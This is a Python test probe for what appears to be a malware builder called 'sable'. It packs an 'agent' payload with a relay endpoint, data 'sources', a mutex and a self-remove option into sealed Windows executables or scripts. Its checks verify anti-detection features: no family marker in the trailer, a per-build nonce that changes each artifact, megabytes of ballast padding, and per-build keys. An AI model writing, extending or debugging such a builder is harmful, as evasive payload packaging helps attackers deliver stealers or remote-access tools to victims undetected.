"""Forge contract: payload members, trailer slots, container layout, seal round trip."""

from __future__ import annotations

import io
import json
import os
import sys
import tempfile
import zipfile
from pathlib import Path

ROOT = Path(r"C:\Users\Kuzenee\Desktop\55555\sable")
sys.path.insert(0, str(ROOT))

from agent import loader
from core import forge, seal
from core.schema import SOURCE_FIELDS, RelayConfig, RunConfig, SourceConfig

results: list[tuple[str, bool, str]] = []


def check(label: str, ok: bool, detail: str = "") -> None:
    results.append((label, ok, detail))


def _pe_stub() -> bytes:
    """The smallest image ``BeginUpdateResource`` accepts, so a build can stamp into it.

    Duplicated from ``tests/support.py`` on purpose: a probe is run against an installed
    tree and cannot import the test package. Kept short rather than clever.
    """
    import struct

    import struct

    dos = bytearray(0x80)
    dos[0:2] = b"MZ"
    struct.pack_into("<I", dos, 0x3C, 0x80)
    coff = struct.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, 0xF0, 0x22)
    optional = bytearray(0xF0)
    struct.pack_into("<H", optional, 0, 0x20B)
    struct.pack_into("<I", optional, 16, 0x1000)
    struct.pack_into("<I", optional, 20, 0x1000)
    struct.pack_into("<I", optional, 32, 0x1000)
    struct.pack_into("<I", optional, 36, 0x200)
    struct.pack_into("<I", optional, 56, 0x2000)
    struct.pack_into("<I", optional, 60, 0x200)
    struct.pack_into("<I", optional, 108, 16)
    section = struct.pack(
        "<8sIIIIIIHHI", b".text", 0x200, 0x1000, 0x200, 0x200, 0, 0, 0, 0, 0x60000020
    )
    head = bytes(dos) + b"PE\x00\x00" + coff + bytes(optional) + section
    return head.ljust(0x200, b"\x00") + b"\xcc" * 0x200


MUTEX = "Global\\SABLE_TEST_MUTEX_9f2c"
SEAL_KEY = "k-3f9a-test-key"
CFG = RunConfig(
    schema_version=1,
    mutex=MUTEX,
    seal_key=SEAL_KEY,
    relay=RelayConfig(kind="https", endpoint="https://example.invalid/relay"),
    sources=SourceConfig(),
    self_remove=False,
    ballast_mb=0,
)


def refuses(label: str, call) -> None:
    try:
        call()
    except forge.ForgeError:
        check(label, True, "")
    except Exception as exc:
        check(label, False, f"{type(exc).__name__}: {exc}")
    else:
        check(label, False, "no error raised")


def main() -> int:
    with tempfile.TemporaryDirectory(prefix="sable-forge-") as scratch:
        work = Path(scratch)

        # --- payload ---
        data = forge.payload(ROOT, CFG)
        check("payload is a zip", data[:2] == b"PK", data[:4].hex())

        archive = zipfile.ZipFile(io.BytesIO(data))
        names = archive.namelist()
        check("payload has agent/entry.py", "agent/entry.py" in names, "")
        check("payload has sable_schema.py", "sable_schema.py" in names, "")
        check("payload has cfg.json", "cfg.json" in names, "")
        check("payload has no pycache", not any("__pycache__" in n for n in names), "")
        agent_count = len([n for n in names if n.startswith("agent/")])
        # Counted against the manifest rather than a magic number: the number rots the
        # moment a module lands, and the property that matters is that the archive carries
        # every agent file the repository ships.
        listed = [
            line.strip()
            for line in (ROOT / "MANIFEST.txt").read_text(encoding="utf-8").splitlines()
            if line.strip().startswith("agent/")
        ]
        missing = [name for name in listed if name not in names]
        check("payload has every agent module", missing == [], f"{agent_count} present, missing {missing}")

        shipped_loader = archive.read("agent/loader.py")
        on_disk = (ROOT / "agent" / "loader.py").read_bytes()
        check("loader shipped verbatim", shipped_loader == on_disk, "")
        check("no secrets in the payload", MUTEX.encode() not in shipped_loader, "")

        shipped_schema = archive.read("sable_schema.py")
        check(
            "schema copied verbatim",
            shipped_schema == (ROOT / "core" / "schema.py").read_bytes(),
            "",
        )

        document = json.loads(archive.read("cfg.json"))
        check("cfg round-trips", document["mutex"] == MUTEX, document["mutex"])
        # Against the schema, not a literal: a field added to SourceConfig is a field the
        # archive has to carry, and a hardcoded set here would silently stop checking.
        check(
            "cfg carries every source flag",
            set(document["sources"]) == set(SOURCE_FIELDS),
            f"{sorted(set(SOURCE_FIELDS) - set(document['sources']))} missing",
        )

        # --- trailer ---
        block = forge.trailer(CFG)
        check("trailer size", len(block) == forge.TRAILER_SIZE, str(len(block)))
        check(
            "trailer key slot",
            block[:forge.KEY_SLOT].rstrip(b"\x00") == SEAL_KEY.encode(),
            "",
        )
        check(
            "trailer mutex slot",
            block[forge.KEY_SLOT:].rstrip(b"\x00") == MUTEX.encode(),
            "",
        )
        check("trailer is fixed width", forge.TRAILER_SIZE == 64 + 800, str(forge.TRAILER_SIZE))
        check(
            "no family marker in the trailer",
            b"SBLK" not in block and b"SBLT" not in block,
            "",
        )

        # --- seal ---
        sealed = seal.seal(data, SEAL_KEY)
        check("sealed size", len(sealed) == seal.sealed_size(len(data)), str(len(sealed)))

        # --- exe container ---
        # A resource-patchable image, not random bytes: every build stamps a per-build nonce
        # into the stub's resources, so a stub that is not a PE is refused before the
        # container arithmetic is ever reached.
        stub = work / "stub.bin"
        stub.write_bytes(_pe_stub())
        exe = work / "artifact.exe"
        forge.build(CFG, sealed, exe, mode="exe", stub=stub)

        blob = exe.read_bytes()
        offset = int.from_bytes(blob[-forge.FOOTER_SIZE:], "little")
        prefix = blob[:offset]
        check(
            "exe size",
            len(blob) == offset + len(sealed) + forge.TRAILER_SIZE + forge.FOOTER_SIZE,
            f"{len(blob)} at offset {offset}",
        )
        check("footer offset", forge.image_end(prefix) == offset, str(offset))
        check("footer carries no marker", blob[-forge.FOOTER_SIZE:] != b"SBLT", blob[-forge.FOOTER_SIZE:].hex())
        check("stub was re-stamped", offset != stub.stat().st_size, f"{offset} vs {stub.stat().st_size}")
        check(
            "per-build nonce is in the resources",
            forge._RT_RCDATA in {ref.kind for ref in forge.resource_refs(prefix)},
            "",
        )

        trailer_start = len(blob) - forge.FOOTER_SIZE - forge.TRAILER_SIZE
        check(
            "trailer sits in front of the footer",
            blob[trailer_start:trailer_start + forge.KEY_SLOT].rstrip(b"\x00")
            == SEAL_KEY.encode(),
            "",
        )
        check(
            "sealed blob ends where the trailer starts",
            blob[trailer_start - len(sealed):trailer_start] == sealed,
            "",
        )

        header = loader._read_trailer(exe)
        check("loader reads the key", header.seal_key == SEAL_KEY, header.seal_key)
        check("loader reads the mutex", header.mutex == MUTEX, header.mutex)

        read_offset = loader._archive_offset(exe)
        check("loader reads the offset", read_offset == offset, str(read_offset))

        recovered = loader._open_sealed(loader._read_sealed(exe, read_offset), header.seal_key)
        check("loader opens the forge seal", recovered == data, f"{len(recovered)} bytes")

        try:
            loader._open_sealed(loader._read_sealed(exe, read_offset), "not-the-key")
        except loader.ArchiveError:
            check("wrong key fails closed", True, "")
        else:
            check("wrong key fails closed", False, "no error raised")

        # --- one launcher, two artifacts ---
        other_key = "k-77bb-second-build"
        other_mutex = "Global\\SABLE_OTHER_MUTEX_4a1e"
        other = RunConfig(
            schema_version=1,
            mutex=other_mutex,
            seal_key=other_key,
            relay=CFG.relay,
            sources=CFG.sources,
            self_remove=False,
            ballast_mb=0,
        )
        second = work / "second.exe"
        forge.build(other, seal.seal(forge.payload(ROOT, other), other_key), second, mode="exe", stub=stub)
        check("second trailer key", loader._read_trailer(second).seal_key == other_key, "")
        check("second trailer mutex", loader._read_trailer(second).mutex == other_mutex, "")
        try:
            loader._open_sealed(
                loader._read_sealed(second, loader._archive_offset(second)), header.seal_key
            )
        except loader.ArchiveError:
            check("keys do not cross artifacts", True, "")
        else:
            check("keys do not cross artifacts", False, "the first key opened the second")

        # --- ballast ---
        padded = RunConfig(
            schema_version=1,
            mutex=MUTEX,
            seal_key=SEAL_KEY,
            relay=CFG.relay,
            sources=CFG.sources,
            self_remove=False,
            ballast_mb=2,
        )
        padded_exe = work / "padded.exe"
        forge.build(padded, sealed, padded_exe, mode="exe", stub=stub)
        padded_offset = loader._archive_offset(padded_exe)
        check(
            "ballast offset",
            padded_offset == offset + 2 * 1024 * 1024,
            f"{padded_offset} vs {offset} + 2 MiB",
        )
        check(
            "ballast size",
            padded_exe.stat().st_size
            == padded_offset + len(sealed) + forge.TRAILER_SIZE + forge.FOOTER_SIZE,
            str(padded_exe.stat().st_size),
        )
        check(
            "ballast payload still opens",
            loader._open_sealed(
                loader._read_sealed(padded_exe, padded_offset), loader._read_trailer(padded_exe).seal_key
            )
            == data,
            "",
        )

        # --- script container ---
        script = work / "artifact.py"
        forge.build(CFG, sealed, script, mode="py")
        text = script.read_text(encoding="utf-8")
        check("script parses", bool(compile(text, str(script), "exec")), "")
        check("script carries the key", f"SEAL_KEY = {SEAL_KEY!r}" in text, "")
        check("script carries the mutex", f"MUTEX = {MUTEX!r}" in text, "")
        check("script takes the mutex", "loader.acquire(MUTEX)" in text, "")
        check("script calls adopt", "loader.adopt(" in text, "")

        # --- refusals ---
        refuses(
            "wrong extension refused",
            lambda: forge.build(CFG, sealed, work / "x.py", mode="exe", stub=stub),
        )
        refuses(
            "missing stub refused",
            lambda: forge.build(CFG, sealed, work / "y.exe", mode="exe"),
        )
        refuses(
            "unknown mode refused",
            lambda: forge.build(CFG, sealed, work / "z.exe", mode="dll", stub=stub),
        )
        refuses(
            "truncated seal refused",
            lambda: forge.build(CFG, b"\x00" * 8, work / "t.exe", mode="exe", stub=stub),
        )
        refuses(
            "oversized key refused",
            lambda: forge.trailer(
                RunConfig(
                    schema_version=1,
                    mutex=MUTEX,
                    seal_key="k" * (forge.KEY_SLOT + 1),
                    relay=CFG.relay,
                    sources=CFG.sources,
                    self_remove=False,
                    ballast_mb=0,
                )
            ),
        )
        refuses("empty mutex refused", lambda: forge.trailer(
            RunConfig(
                schema_version=1,
                mutex="  ",
                seal_key=SEAL_KEY,
                relay=CFG.relay,
                sources=CFG.sources,
                self_remove=False,
                ballast_mb=0,
            )
        ))

        # A launcher with no trailer behind it is not an artifact.
        bare = work / "bare.exe"
        bare.write_bytes(stub.read_bytes())
        try:
            loader._read_trailer(bare)
        except loader.ArchiveError:
            check("no trailer fails closed", True, "")
        else:
            check("no trailer fails closed", False, "no error raised")

    failed = [item for item in results if not item[1]]
    for label, ok, detail in results:
        print(f"{'PASS' if ok else 'FAIL'}  {label}  {detail}")
    print(f"\n{len(results) - len(failed)}/{len(results)} passed")
    return 0 if not failed else 1


if __name__ == "__main__":
    raise SystemExit(main())
